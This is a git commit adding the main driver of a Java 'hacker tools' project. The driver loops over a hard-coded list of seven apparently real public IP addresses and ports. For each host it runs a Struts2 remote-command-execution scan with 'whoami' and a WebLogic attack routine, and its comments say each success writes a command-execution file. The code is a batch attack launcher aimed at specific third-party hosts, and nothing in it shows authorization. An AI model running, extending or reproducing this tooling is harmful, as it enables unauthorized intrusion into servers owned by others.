864684b667a02d4e5a05ce0ed03609b09b530906
xiatian <xiatian@QQ1160.local>
2016-06-22 14:56:26 +0800

    增加主函数程序

---
+++ javacode/hackertools/com/mtx/xiatian/Main.java
@@ -0,0 +1,73 @@
+package com.mtx.xiatian;
+
+import java.util.ArrayList;
+import java.util.List;
+
+import com.mtx.xiatian.hacker.MTX_AttackWeblogic;
+import com.mtx.xiatian.hacker.struts2Scan.Struts2ScanManager;
+
+
+/**
+ * 批量渗透测试的主程序
+ * https://github.com/hktalent/MTX_HackerTools.git
+ * @author mtx
+ *
+ */
+public class Main
+{
+	/**
+	 * 渗透检测
+	 * @param ips  ip之间分号、逗号分隔；58.210.227.26;60.173.247.15
+	 * @param ports 7001;7001,8001
+	 * @param path
+	 */
+	public static void testWeblogic_Struts2(String ips, String ports, String path)
+	{
+		String s1 = "[;,]";
+		String []a = ips.split(s1), a1 = ports.split("[;]"), a3;
+		MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
+		Struts2ScanManager sm = Struts2ScanManager.getInstance();
+		ma.useMysql();
+		ma.hvLastScan = false;
+		int x = 0, y = a1.length;
+		List<Object[]> list1 = new ArrayList<Object[]>();
+		// ip循环
+		for(int i = 0, j = a.length; i < j; i++)
+		{
+			// 每个ip对应的端口用；分割，每个端口之间用,分开
+			// 端口的分组数量和ip个数应该对等、相同，否则就直接使用上一组的ip
+			x = i;
+			if(x >= y)x--;
+			a3 = a1[x].split(",");
+			for(int w = 0, k = a3.length; w < k; w++)
+			{
+				// 多线程抓取form表单，找到action路径，尝试struts2漏洞检测
+				// 如果path有非null值就直接使用
+				;// 还没有写
+				if(null != path)
+					sm.doS2Scan("http://" +a[i] + ":" +  a3[w] + path, list1, "whoami");
+				else
+				{
+					;
+				}
+				
+				// 如果有漏洞，会在data目录产生一个命令执行的txt文件
+				ma.connSvr(a[i],  a3[w], null, null);
+			}
+		}
+		
+	}
+	/**
+	 * @param args
+	 */
+	public static void main(String[] args)
+	{
+		// 如果当前环境有代理，就使用系统设置的代理
+		System.setProperty("java.net.useSystemProxies", "true");
+		
+		testWeblogic_Struts2(
+				"60.173.247.15;222.168.33.117;58.210.227.26;218.62.83.78;183.131.128.215;222.168.33.108;124.42.10.247", 
+				"7001;8001;7001;8080;80;9001;80,7001", 
+				"/login");
+	}
+}
